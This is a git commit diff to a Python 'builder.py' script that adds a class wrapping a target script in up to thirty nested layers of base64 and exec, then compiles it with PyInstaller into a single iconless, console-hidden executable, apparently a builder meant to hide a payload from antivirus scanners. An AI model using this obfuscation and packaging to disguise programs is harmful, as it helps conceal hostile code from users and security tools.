a939987cd8b1c7b7c8c0af8cb89250cf621b6ea8
addi00000 <addison@othius.com>
2022-04-15 10:01:38 -0400

    Added obfuscation to builder + Other things

--- builder.py
+++ builder.py
@@ -1,12 +1,17 @@
+import base64
+from fileinput import filename
 import os
 import shutil
+import time
 
 import requests
+from alive_progress import alive_bar
 from colorama import Fore, Style, init
 from cryptography.fernet import Fernet
 
+def main():    
+    global level, filename
 
-def main():
     print(Fore.BLUE + """
 __________                                         
 \______   \ ____   _________    ________ __  ______
@@ -46,6 +51,10 @@ __________
             
     print(Fore.GREEN + "Done!" + Style.RESET_ALL)
     
+
+    level = int(input(Fore.CYAN + "Obfuscation level (1-30): " + Style.RESET_ALL))
+    Obfuscate()
+    
     compile = str(input(Fore.CYAN + "Compile? (y/n): " + Style.RESET_ALL))
     
     if compile == 'y' or compile == 'Y':
@@ -54,17 +63,65 @@ __________
         
         os.system(r"pip install --upgrade -r .\requirements.txt")
         
-        os.system(f"python -m PyInstaller --onefile --noconsole -i NONE --distpath ./ .\{filename}.py")
+        os.system(f"python -m PyInstaller --onefile --noconsole -i NONE --distpath ./ .\{filename}-obfuscated.py")
         
         shutil.rmtree(r".\build")
         shutil.rmtree(r".\__pycache__")
-        os.remove(f".\{filename}.spec")
+        os.remove(f".\{filename}-obfuscated.spec")
                 
         input(Fore.GREEN + "Done!\nPress enter to exit..." + Style.RESET_ALL)
         
     else:
         exit()
+
+class Obfuscate:
+    def __init__(self):
+        self.file = f"{filename}.py"
+        self.level = level
+        
+        self.clean()
+        time.sleep(0.5)
+        self.save(self.obfuscate(self.code(self.file), self.level), self.file, self.seperate_imports(self.file))
+
+    def code(self, file):
+        with open(file, 'r', encoding="utf-8") as f:
+            code = f.read()
+            
+        return code
+
+    def seperate_imports(self, file):
+        imports = []
+        
+        with open(file, "r", encoding="utf-8") as f:
+            lines = [line.rstrip() for line in f]
+            
+            for line in lines:
+                if line.startswith("import") or line.startswith("from"):
+                    imports.append(line)
+        
+        return imports
     
+    def obfuscate(self, code, level):
+        obfuscated = f"\nexec(base64.b64decode({base64.b64encode(code.encode('utf-8',errors = 'strict'))}))"
+    
+        with alive_bar(level) as bar:
+            for e in range(level):
+                obfuscated = f"import base64\nexec(base64.b64decode({base64.b64encode(obfuscated.encode('utf-8',errors = 'strict'))}))"
+                bar() 
+            
+        return obfuscated
+    
+    def save(self, obfuscated, file, imports=None):
+        with open(f"{file.replace('.py', '')}-obfuscated.py", 'a', encoding="utf-8") as f:
+            for module in imports:
+                f.write(module + "\n")
+                
+            f.write(obfuscated)
+    
+    def clean(self):
+        if os.path.exists(f"{self.file.replace('.py', '')}-obfuscated.py"):
+            os.remove(f"{self.file.replace('.py', '')}-obfuscated.py")
+              
 if __name__ == '__main__':
     init()
     main()
